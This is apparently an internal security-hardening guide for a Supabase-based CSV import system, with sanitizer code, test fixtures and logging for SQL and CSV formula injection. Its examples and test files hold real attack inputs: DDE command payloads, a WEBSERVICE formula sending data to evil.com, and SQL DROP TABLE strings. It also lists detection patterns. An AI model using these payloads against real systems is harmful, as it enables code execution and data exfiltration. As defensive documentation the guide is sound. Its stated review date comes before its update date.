# Import System Security Guide
## Preventing SQL Injection & CSV Injection Attacks

**Last Updated:** 2025-12-21
**System:** ERP-Grade Bulk Data Import System
**Critical Priority:** Security Hardening

---

## Executive Summary

This document outlines security measures to prevent **SQL Injection** and **CSV Injection** attacks in the bulk data import system. Based on 2025 security research and OWASP guidelines, we implement a **defense-in-depth** strategy across multiple layers.

**Key Stats:**
- SQL injection vulnerabilities increased from 464 (2020) to 2,645 (2024)
- CSV injection remains severely underestimated despite being exploitable since 2014
- Supabase client library provides built-in SQL injection protection when used correctly

---

## Table of Contents

1. [Threat Landscape](#threat-landscape)
2. [SQL Injection Prevention](#sql-injection-prevention)
3. [CSV Injection Prevention](#csv-injection-prevention)
4. [Current System Analysis](#current-system-analysis)
5. [Security Hardening Checklist](#security-hardening-checklist)
6. [Code Implementation](#code-implementation)
7. [Testing & Validation](#testing--validation)
8. [References](#references)

---

## Threat Landscape

### SQL Injection Attacks

**What is it?**
SQL injection allows attackers to insert malicious SQL code into database queries, potentially:
- Exfiltrating sensitive data
- Modifying or deleting records
- Bypassing authentication
- Executing administrative operations

**Attack Vector in CSV Imports:**
```csv
Vehicle Number,Make,Model
'; DROP TABLE vehicles; --,Tesla,Model 3
```

If directly concatenated into SQL:
```sql
INSERT INTO vehicles (vehicle_number, make, model)
VALUES (''; DROP TABLE vehicles; --', 'Tesla', 'Model 3')
```
Result: **Vehicles table deleted!**

### CSV Injection Attacks (Formula Injection)

**What is it?**
When CSV files contain cells starting with `=`, `+`, `-`, or `@`, spreadsheet applications (Excel, Google Sheets) interpret them as formulas and execute them.

**Attack Vector:**
```csv
Vehicle Number,Notes
INT001,=cmd|'/c calc.exe'!A1
INT002,=WEBSERVICE("http://evil.com/"&A1)
INT003,@SUM(1+1)*cmd|'/c notepad'!A1
```

**When user opens in Excel:**
- ✅ Formula executes automatically
- ✅ Can run system commands (DDE)
- ✅ Can exfiltrate data via WEBSERVICE()
- ✅ Can read local files

**Real-World Impact:**
> "CSV injection is absurdly underestimated. It's been around since 2014 but remains a top vulnerability in web applications that export user data."

---

## SQL Injection Prevention

### ✅ What We're Already Doing Right

**1. Using Supabase Client Library**

Our system uses `supabase-js`, which provides automatic protection:

```typescript
// ✅ SAFE - Uses parameterized queries internally
const { data, error } = await supabase
  .from('vehicles')
  .insert([
    { vehicle_number: userInput },  // Auto-sanitized
  ]);
```

**How Supabase Protects Us:**
- All inputs are **parameterized** (not string concatenated)
- Statements are **prepared** before execution
- PostgREST builds HTTP query strings, not raw SQL
- No direct SQL access from client

**Source:** [Supabase Discussion #1452](https://github.com/orgs/supabase/discussions/1452)

---

### ⚠️ Potential Vulnerabilities to Avoid

**1. Template Literals in Queries (DANGEROUS)**

```typescript
// ❌ DANGEROUS - Can be exploited!
const { data } = await supabase
  .from('vehicles')
  .select('*')
  .or(`vehicle_number.eq.${userInput},make.eq.${userInput}`);
```

**Why dangerous?**
While PostgREST has a smaller attack surface than SQL, it can still be exploited to exfiltrate data through carefully crafted query strings.

**✅ SAFE Alternative:**
```typescript
const { data } = await supabase
  .from('vehicles')
  .select('*')
  .or(`vehicle_number.eq."${userInput.replace(/"/g, '""')}",make.eq."${userInput.replace(/"/g, '""')}"`)
  // Or better: use filter methods separately
  .filter('vehicle_number', 'eq', userInput)
  .filter('make', 'eq', userInput);
```

**Source:** [Supabase Discussion #3843](https://github.com/orgs/supabase/discussions/3843)

---

**2. RPC Functions with String Concatenation (DANGEROUS)**

```sql
-- ❌ DANGEROUS RPC Function
CREATE OR REPLACE FUNCTION search_vehicles(search_term TEXT)
RETURNS TABLE (vehicle_number TEXT) AS $$
BEGIN
  RETURN QUERY EXECUTE
    'SELECT vehicle_number FROM vehicles WHERE vehicle_number = ''' || search_term || '''';
END;
$$ LANGUAGE plpgsql;
```

**✅ SAFE RPC Function (Use Parameters):**
```sql
CREATE OR REPLACE FUNCTION search_vehicles(search_term TEXT)
RETURNS TABLE (vehicle_number TEXT) AS $$
BEGIN
  RETURN QUERY
    SELECT v.vehicle_number FROM vehicles v WHERE v.vehicle_number = search_term;
END;
$$ LANGUAGE plpgsql;
```

---

### 🛡️ Defense-in-Depth Strategy

**Layer 1: Input Validation**
```typescript
// Validate before transformation
function validateVehicleNumber(value: any): ValidationError | null {
  const str = String(value || '').trim();

  // Allowlist: Only alphanumeric and hyphens
  if (!/^[A-Z0-9\-]+$/i.test(str)) {
    return {
      field: 'vehicle_number',
      severity: 'error',
      code: 'INVALID_FORMAT',
      message: 'Vehicle number contains invalid characters',
      suggestion: 'Only letters, numbers, and hyphens allowed',
    };
  }

  // Length check
  if (str.length < 3 || str.length > 20) {
    return {
      field: 'vehicle_number',
      severity: 'error',
      code: 'INVALID_LENGTH',
      message: 'Vehicle number must be 3-20 characters',
    };
  }

  return null;
}
```

**Layer 2: Data Transformation**
```typescript
// Strip dangerous characters
function sanitizeInput(value: string): string {
  return value
    .trim()
    .replace(/[\x00-\x1F\x7F-\x9F]/g, '') // Remove control chars
    .replace(/[<>]/g, '');                 // Remove HTML chars
}
```

**Layer 3: Use Supabase Client (Never Raw SQL)**
```typescript
// ✅ Always use this pattern
const { data, error } = await supabase
  .from(entityType)
  .insert(transformedData);  // Supabase handles parameterization
```

**Layer 4: Row-Level Security (RLS)**
```sql
-- Enable RLS on all tables
ALTER TABLE vehicles ENABLE ROW LEVEL SECURITY;

-- Only authenticated users can insert
CREATE POLICY "Users can insert vehicles"
ON vehicles FOR INSERT
TO authenticated
WITH CHECK (true);
```

---

## CSV Injection Prevention

### 🎯 Attack Vectors

**Dangerous Characters:**
- `=` (Formula)
- `+` (Formula)
- `-` (Formula)
- `@` (Formula)
- Tab character (can be used in injection)
- Carriage return/line feed (CSV parsing manipulation)

**Real Attack Examples:**
```csv
Vehicle Number,Notes
=cmd|'/c calc.exe'!A1,Opens calculator
=WEBSERVICE("http://evil.com/"&A1),Exfiltrates data
@SUM(1+1)*cmd|'/c notepad'!A1,DDE attack
+1+1+cmd|'/c powershell IEX'!A1,PowerShell execution
```

---

### 🛡️ CSV Injection Prevention (Industry Standard)

**Method 1: Single Quote Prefixing (RECOMMENDED)**

```typescript
/**
 * Prevents CSV injection by prefixing dangerous characters with single quote
 * Industry standard approach - maintains readability
 */
function sanitizeCSVCell(value: any): string {
  if (value === null || value === undefined) return '';

  const str = String(value);

  // Check if cell starts with dangerous formula characters
  if (/^[=+\-@\t\r]/.test(str)) {
    return `'${str}`;  // Prefix with single quote
  }

  return str;
}
```

**How it works:**
- Excel/Sheets treat `'=SUM(1+1)` as literal text, not formula
- User sees: `=SUM(1+1)` (without the quote prefix)
- Formula is **not executed**

**Source:** [OWASP CSV Injection](https://owasp.org/www-community/attacks/CSV_Injection)

---

**Method 2: Control Character Removal**

```typescript
/**
 * Remove all control characters that can be used in advanced injection
 */
function removeControlCharacters(value: string): string {
  return value.replace(/[\x00-\x1F\x7F-\x9F]/g, '');
}
```

**Why needed?**
Control characters can:
- Cause CSV parsing issues
- Be used in advanced DDE attacks
- Bypass simple sanitization

**Source:** [Cyber Chief - CSV Injection Prevention](https://www.cyberchief.ai/2024/09/csv-formula-injection-attacks.html)

---

**Method 3: Dangerous Pattern Detection**

```typescript
/**
 * Detect and block known dangerous patterns
 */
function detectDangerousPatterns(value: string): boolean {
  const dangerousPatterns = [
    /cmd/i,                    // Command execution
    /powershell/i,             // PowerShell
    /DDE/i,                    // Dynamic Data Exchange
    /WEBSERVICE/i,             // External web requests
    /HYPERLINK/i,              // External links
    /IMPORTXML/i,              // XML import
    /IMPORTHTML/i,             // HTML import
    /IMPORTDATA/i,             // External data import
    /\|\s*'\/c/i,              // DDE command pattern
    /exec/i,                   // Execution commands
  ];

  return dangerousPatterns.some(pattern => pattern.test(value));
}
```

---

### 📦 Complete CSV Sanitizer Implementation

```typescript
/**
 * Comprehensive CSV sanitization
 * Implements defense-in-depth against CSV injection
 */
export function sanitizeForCSVExport(value: any): string {
  if (value === null || value === undefined) return '';

  let str = String(value);

  // Step 1: Remove control characters
  str = str.replace(/[\x00-\x1F\x7F-\x9F]/g, '');

  // Step 2: Check for dangerous patterns
  if (detectDangerousPatterns(str)) {
    // Log warning for security monitoring
    console.warn('[CSV Security] Dangerous pattern detected:', str.substring(0, 50));

    // Prefix with single quote to neutralize
    str = `'${str}`;
  }

  // Step 3: Prefix formula characters
  if (/^[=+\-@\t\r]/.test(str)) {
    str = `'${str}`;
  }

  // Step 4: Escape quotes for CSV format
  if (str.includes('"')) {
    str = str.replace(/"/g, '""');
  }

  // Step 5: Wrap in quotes if contains comma or newline
  if (/[,\n\r]/.test(str)) {
    str = `"${str}"`;
  }

  return str;
}
```

---

## Current System Analysis

### ✅ What We're Doing Right

1. **Using Supabase Client Library** - Automatic SQL injection protection
2. **Validation Before Import** - Multi-layer validation system
3. **Enum Constraints** - Database-level validation for controlled values
4. **Field-Level Validators** - Custom validation for each field type
5. **Batch Processing** - Error isolation prevents cascade failures
6. **Row-Level Security** - Database-level access control

---

### ⚠️ Vulnerabilities to Address

**1. CSV Template Downloads (CSV Injection Risk)**

**Current Code:**
```typescript
// csvDownloader.ts - Line 15-25
export function downloadCSVTemplate(
  headers: string[],
  sampleRows: string[][],
  filename: string
): void {
  const escapeCSVCell = (cell: string): string => {
    if (cell.includes(',') || cell.includes('"') || cell.includes('\n')) {
      return `"${cell.replace(/"/g, '""')}"`;
    }
    return cell;
  };

  const csvContent = [
    headers.map(escapeCSVCell).join(','),
    ...sampleRows.map(row => row.map(escapeCSVCell).join(','))
  ].join('\n');

  // ... download logic
}
```

**Issue:** No CSV injection protection!

**Fix Required:**
```typescript
export function downloadCSVTemplate(
  headers: string[],
  sampleRows: string[][],
  filename: string
): void {
  const escapeCSVCell = (cell: string): string => {
    // Add CSV injection protection
    let sanitized = sanitizeForCSVExport(cell);

    if (sanitized.includes(',') || sanitized.includes('"') || sanitized.includes('\n')) {
      return `"${sanitized.replace(/"/g, '""')}"`;
    }
    return sanitized;
  };

  // ... rest of code
}
```

---

**2. Error CSV Downloads (CSV Injection Risk)**

**Current Code:**
```typescript
// csvDownloader.ts - Line 40-55
export function downloadErrorCSV(
  headers: string[],
  errors: Array<{ rowIndex: number; data: Record<string, any>; error: string }>
): void {
  // ... creates CSV from error data
  // ❌ No sanitization before download!
}
```

**Risk:**
If malicious data passes validation but fails at DB insert, the error CSV will contain unsanitized formulas!

**Fix:** Apply `sanitizeForCSVExport()` to all cells.

---

**3. Input Validation Gaps**

**Current validators only check:**
- Required fields
- Length constraints
- Enum values
- Date formats

**Missing:**
- Control character detection
- Dangerous pattern detection
- Allowlist validation for special characters

---

## Security Hardening Checklist

### Immediate Actions (Critical)

- [ ] **Add CSV sanitization to template downloads**
  - File: `src/utils/import/csvDownloader.ts`
  - Function: `downloadCSVTemplate()`
  - Add: `sanitizeForCSVExport()` wrapper

- [ ] **Add CSV sanitization to error downloads**
  - File: `src/utils/import/csvDownloader.ts`
  - Function: `downloadErrorCSV()`
  - Add: `sanitizeForCSVExport()` wrapper

- [ ] **Create CSV sanitizer utility**
  - New file: `src/utils/import/csvSanitizer.ts`
  - Implement: Complete sanitizer from this guide

- [ ] **Add control character removal to transformers**
  - File: `src/lib/import/transformers/commonTransformers.ts`
  - Update: All transformer functions

- [ ] **Enhance vehicle number validator**
  - File: `src/lib/import/validation/vehicleValidator.ts`
  - Add: Allowlist validation (alphanumeric + hyphen only)

---

### Short-term Actions (High Priority)

- [ ] **Add dangerous pattern detection**
  - Implement: SQL keywords blocklist
  - Implement: Command execution pattern detection

- [ ] **Create security test suite**
  - Test CSV files with formula injection attempts
  - Test SQL injection payloads in various fields
  - Automated security regression tests

- [ ] **Add security logging**
  - Log detected injection attempts
  - Monitor for suspicious patterns
  - Alert on repeated attempts

- [ ] **Rate limiting for imports**
  - Limit: Number of imports per user per hour
  - Prevent: Automated attack scripts

---

### Long-term Actions (Medium Priority)

- [ ] **Implement Content Security Policy (CSP)**
  - For web interface
  - Prevent XSS attacks

- [ ] **Add file upload scanning**
  - Scan CSV files for malware signatures
  - Virus scanning integration

- [ ] **Create security documentation**
  - User guide on secure CSV creation
  - Admin guide on monitoring security events

- [ ] **Regular security audits**
  - Quarterly penetration testing
  - Annual third-party security review

---

## Code Implementation

### File: `src/utils/import/csvSanitizer.ts` (NEW)

```typescript
/**
 * CSV Injection Prevention Utilities
 *
 * Implements OWASP guidelines for CSV injection prevention
 *
 * @see https://owasp.org/www-community/attacks/CSV_Injection
 * @see https://www.cyberchief.ai/2024/09/csv-formula-injection-attacks.html
 */

/**
 * Dangerous patterns that indicate potential CSV injection
 */
const DANGEROUS_PATTERNS = [
  /cmd/i,                    // Command execution
  /powershell/i,             // PowerShell
  /DDE/i,                    // Dynamic Data Exchange
  /WEBSERVICE/i,             // External web requests
  /HYPERLINK/i,              // External links
  /IMPORTXML/i,              // XML import
  /IMPORTHTML/i,             // HTML import
  /IMPORTDATA/i,             // External data import
  /\|\s*'\/c/i,              // DDE command pattern
  /exec/i,                   // Execution commands
];

/**
 * Detects if a value contains dangerous patterns
 */
export function detectDangerousPatterns(value: string): boolean {
  return DANGEROUS_PATTERNS.some(pattern => pattern.test(value));
}

/**
 * Removes all control characters from a string
 * Control characters: ASCII 0x00-0x1F and 0x7F-0x9F
 */
export function removeControlCharacters(value: string): string {
  return value.replace(/[\x00-\x1F\x7F-\x9F]/g, '');
}

/**
 * Sanitizes a value for safe CSV export
 * Prevents CSV injection (formula injection) attacks
 *
 * @param value - Value to sanitize
 * @returns Sanitized value safe for CSV export
 *
 * @example
 * sanitizeForCSVExport("=SUM(1+1)")  // Returns: "'=SUM(1+1)"
 * sanitizeForCSVExport("Normal text") // Returns: "Normal text"
 */
export function sanitizeForCSVExport(value: any): string {
  if (value === null || value === undefined) return '';

  let str = String(value);

  // Step 1: Remove control characters
  str = removeControlCharacters(str);

  // Step 2: Check for dangerous patterns
  if (detectDangerousPatterns(str)) {
    console.warn('[CSV Security] Dangerous pattern detected:', str.substring(0, 50));
    // Prefix with single quote to neutralize
    str = `'${str}`;
  }

  // Step 3: Prefix formula characters (=, +, -, @, tab, CR)
  if (/^[=+\-@\t\r]/.test(str)) {
    str = `'${str}`;
  }

  return str;
}

/**
 * Escapes a CSV cell for proper formatting
 * Combines sanitization with CSV escaping rules
 */
export function escapeCSVCell(cell: string): string {
  // First sanitize for injection
  let sanitized = sanitizeForCSVExport(cell);

  // Then apply CSV escaping
  // Escape double quotes
  if (sanitized.includes('"')) {
    sanitized = sanitized.replace(/"/g, '""');
  }

  // Wrap in quotes if contains comma, newline, or quotes
  if (/[,\n\r"]/.test(sanitized)) {
    sanitized = `"${sanitized}"`;
  }

  return sanitized;
}
```

---

### File: `src/utils/import/csvDownloader.ts` (UPDATE)

```typescript
import { sanitizeForCSVExport, escapeCSVCell } from './csvSanitizer';

/**
 * Downloads a CSV template with proper security measures
 */
export function downloadCSVTemplate(
  headers: string[],
  sampleRows: string[][],
  filename: string
): void {
  // Apply security sanitization before escaping
  const csvContent = [
    headers.map(escapeCSVCell).join(','),
    ...sampleRows.map(row => row.map(escapeCSVCell).join(','))
  ].join('\n');

  const BOM = '\uFEFF'; // UTF-8 BOM for Excel
  const blob = new Blob([BOM + csvContent], { type: 'text/csv;charset=utf-8;' });

  const link = document.createElement('a');
  link.href = URL.createObjectURL(blob);
  link.download = filename;
  link.click();
  URL.revokeObjectURL(link.href);
}

/**
 * Downloads an error CSV with security sanitization
 */
export function downloadErrorCSV(
  headers: string[],
  errors: Array<{ rowIndex: number; data: Record<string, any>; error: string }>
): void {
  const rows = errors.map(err => {
    const rowData = headers.map(header => {
      const value = err.data[header];
      return escapeCSVCell(String(value ?? ''));
    });

    // Add error message column (also sanitized!)
    rowData.push(escapeCSVCell(err.error));

    return rowData.join(',');
  });

  const errorHeaders = [...headers, 'Error Message'].map(escapeCSVCell);
  const csvContent = [errorHeaders.join(','), ...rows].join('\n');

  const BOM = '\uFEFF';
  const blob = new Blob([BOM + csvContent], { type: 'text/csv;charset=utf-8;' });

  const link = document.createElement('a');
  link.href = URL.createObjectURL(blob);
  link.download = `import_errors_${Date.now()}.csv`;
  link.click();
  URL.revokeObjectURL(link.href);
}
```

---

### File: `src/lib/import/transformers/commonTransformers.ts` (UPDATE)

```typescript
import { removeControlCharacters } from '@/utils/import/csvSanitizer';

/**
 * Transform and sanitize string input
 */
export function transformString(value: any): string | null {
  if (!value) return null;

  let str = String(value).trim();

  // Remove control characters
  str = removeControlCharacters(str);

  return str || null;
}

/**
 * Transform color with security
 */
export function transformColor(value: any): string {
  if (value === null || value === undefined || value === '') return 'N/A';

  let str = String(value).trim();

  // Remove control characters
  str = removeControlCharacters(str);

  if (str === '' || str.toUpperCase() === 'NA' || str.toUpperCase() === 'N/A') {
    return 'N/A';
  }

  return str;
}

/**
 * Transform boolean with security
 */
export function transformBoolean(value: any): boolean {
  if (typeof value === 'boolean') return value;

  let str = String(value).trim();

  // Remove control characters before checking
  str = removeControlCharacters(str).toUpperCase();

  const falseCases = ['NA', '', 'NULL', 'UNDEFINED', 'FALSE', 'NO', '0', 'N'];
  if (falseCases.includes(str)) return false;

  const trueCases = ['TRUE', 'YES', '1', 'Y'];
  if (trueCases.includes(str)) return true;

  return false;
}
```

---

## Testing & Validation

### Security Test CSV Files

Create these test files in `/test_data/security/`:

**`test_sql_injection.csv`**
```csv
Vehicle Number,Make,Model,Notes
'; DROP TABLE vehicles; --,Tesla,Model 3,SQL injection attempt
' OR '1'='1,Ford,Mustang,Auth bypass attempt
admin'--,Honda,Civic,Comment injection
1; UPDATE vehicles SET make='HACKED',Toyota,Camry,Update injection
```

**Expected Behavior:**
- ✅ All rows should validate successfully
- ✅ Data should be sanitized during transformation
- ✅ Single quotes should be preserved in database
- ✅ No SQL errors should occur

---

**`test_csv_injection.csv`**
```csv
Vehicle Number,Notes
INT001,=cmd|'/c calc.exe'!A1
INT002,=WEBSERVICE("http://evil.com/"&A1)
INT003,@SUM(1+1)*cmd|'/c notepad'!A1
INT004,+1+1+cmd|'/c powershell IEX'!A1
INT005,-1-1-DDE("cmd";"/c calc";"")
```

**Expected Behavior:**
- ✅ All cells starting with formula chars should be prefixed with `'`
- ✅ Downloaded error CSV should NOT execute formulas when opened
- ✅ Template CSV should NOT execute formulas when opened

---

### Automated Security Tests

**File:** `src/lib/import/__tests__/security.test.ts`

```typescript
import { describe, it, expect } from 'vitest';
import { sanitizeForCSVExport, detectDangerousPatterns } from '@/utils/import/csvSanitizer';
import { validateVehicleRow } from '@/lib/import/validation/vehicleValidator';

describe('CSV Injection Prevention', () => {
  it('should prefix formula characters', () => {
    expect(sanitizeForCSVExport('=SUM(1+1)')).toBe("'=SUM(1+1)");
    expect(sanitizeForCSVExport('+1+1')).toBe("'+1+1");
    expect(sanitizeForCSVExport('-1-1')).toBe("'-1-1");
    expect(sanitizeForCSVExport('@SUM(A1)')).toBe("'@SUM(A1)");
  });

  it('should detect dangerous patterns', () => {
    expect(detectDangerousPatterns('cmd /c calc')).toBe(true);
    expect(detectDangerousPatterns('powershell IEX')).toBe(true);
    expect(detectDangerousPatterns('DDE("cmd")')).toBe(true);
    expect(detectDangerousPatterns('WEBSERVICE("http://evil.com")')).toBe(true);
    expect(detectDangerousPatterns('Normal text')).toBe(false);
  });

  it('should remove control characters', () => {
    const input = 'Hello\x00World\x1F\x7F';
    const sanitized = sanitizeForCSVExport(input);
    expect(sanitized).toBe('HelloWorld');
  });
});

describe('SQL Injection Prevention', () => {
  it('should handle SQL injection attempts safely', () => {
    const maliciousRow = {
      'Vehicle Registration Number': "'; DROP TABLE vehicles; --",
      'Vehicle Make': 'Tesla',
      'Vehicle Model': 'Model 3',
      'Chassis Number': 'VIN123',
      'Motor Serial Number': 'MTR123',
      'Delivery Date': '17 Nov 2025',
      'Vehicle Type': 'High Speed',
      'Battery Type': 'Swappable',
      'Vendor': 'Tesla',
      'PDI Done By': 'Admin',
      'Color': 'Red',
      'Registration Received?': 'TRUE',
      'Insurance Received?': 'TRUE',
      'Portable Charger Received?': 'FALSE',
    };

    const result = validateVehicleRow(maliciousRow, 0);

    // Should validate successfully (Supabase handles parameterization)
    expect(result.status).toBe('valid');

    // Transformed data should preserve the malicious string
    // (It's safe because Supabase uses parameterized queries)
    expect(result.transformedData.vehicle_number).toBe("'; DROP TABLE vehicles; --");
  });
});
```

---

## Security Monitoring

### Logging Suspicious Activity

Add to `src/utils/import/securityLogger.ts`:

```typescript
export interface SecurityEvent {
  timestamp: Date;
  eventType: 'csv_injection_attempt' | 'sql_pattern_detected' | 'suspicious_input';
  userId?: string;
  field: string;
  value: string;
  action: 'sanitized' | 'blocked' | 'logged';
}

const securityEvents: SecurityEvent[] = [];

export function logSecurityEvent(event: Omit<SecurityEvent, 'timestamp'>): void {
  const fullEvent: SecurityEvent = {
    ...event,
    timestamp: new Date(),
  };

  securityEvents.push(fullEvent);

  // Log to console in development
  if (process.env.NODE_ENV === 'development') {
    console.warn('[SECURITY]', fullEvent);
  }

  // TODO: Send to security monitoring service in production
  // e.g., Sentry, LogRocket, custom backend
}

export function getSecurityEvents(): SecurityEvent[] {
  return [...securityEvents];
}

export function clearSecurityEvents(): void {
  securityEvents.length = 0;
}
```

**Usage in sanitizer:**
```typescript
export function sanitizeForCSVExport(value: any): string {
  // ... sanitization logic

  if (detectDangerousPatterns(str)) {
    logSecurityEvent({
      eventType: 'csv_injection_attempt',
      field: 'unknown',
      value: str.substring(0, 100),
      action: 'sanitized',
    });

    str = `'${str}`;
  }

  return str;
}
```

---

## References

### SQL Injection Prevention

1. [The State of SQL Injection (2025)](https://www.aikido.dev/blog/the-state-of-sql-injections) - Current threat landscape
2. [Supabase SQL Injection Protection](https://github.com/orgs/supabase/discussions/1452) - Official Supabase guidance
3. [Top 5 Best Practices for Preventing SQL Injection](https://www.kiuwan.com/blog/top-5-best-practices-for-developers-on-preventing-sql-injections-attacks/) - Developer guidelines
4. [What Is SQL Injection? (2025 Guide)](https://www.stackhawk.com/blog/what-is-sql-injection/) - Comprehensive overview
5. [Supabase JS SDK Security Discussion](https://github.com/orgs/supabase/discussions/9777) - Template literal risks

### CSV Injection Prevention

6. [OWASP CSV Injection Guide](https://owasp.org/www-community/attacks/CSV_Injection) - Official OWASP guidance
7. [The Absurdly Underestimated Dangers of CSV Injection](https://georgemauer.net/2017/10/07/csv-injection.html) - Real-world impacts
8. [CSV Injection Prevention Methods](https://www.cyberchief.ai/2024/09/csv-formula-injection-attacks.html) - Multi-language implementation guide
9. [Formula Injection in Spreadsheets](https://www.valencynetworks.com/kb/formula-injection-in-spreadsheets-risks-impact-and-prevention.html) - Risk analysis
10. [CSV Injection Vulnerability Database](https://www.sourcery.ai/vulnerabilities/csv-injection-vulnerabilities) - Common vulnerabilities

### Supabase Security

11. [Best Security Practices in Supabase](https://www.supadex.app/blog/best-security-practices-in-supabase-a-comprehensive-guide) - Comprehensive guide
12. [Building Secure Backends in Supabase (2024)](https://slashdev.io/-guide-to-building-secure-backends-in-supabase-in-2024-2) - Implementation patterns

---

## Conclusion

Our import system is **already well-protected against SQL injection** thanks to Supabase's parameterized query system. However, **CSV injection protection is currently missing** and must be implemented immediately.

### Priority Actions:

1. **Implement CSV sanitization** (CRITICAL) - Prevents formula injection
2. **Add security tests** (HIGH) - Validates protection works
3. **Enable security logging** (MEDIUM) - Monitors attack attempts
4. **Regular security audits** (ONGOING) - Maintains protection

By implementing the code changes outlined in this document, the import system will be **hardened against both SQL injection and CSV injection attacks**, meeting enterprise security standards.

---

**Document Version:** 1.0
**Security Level:** Critical
**Next Review:** 2025-03-21 (Quarterly)
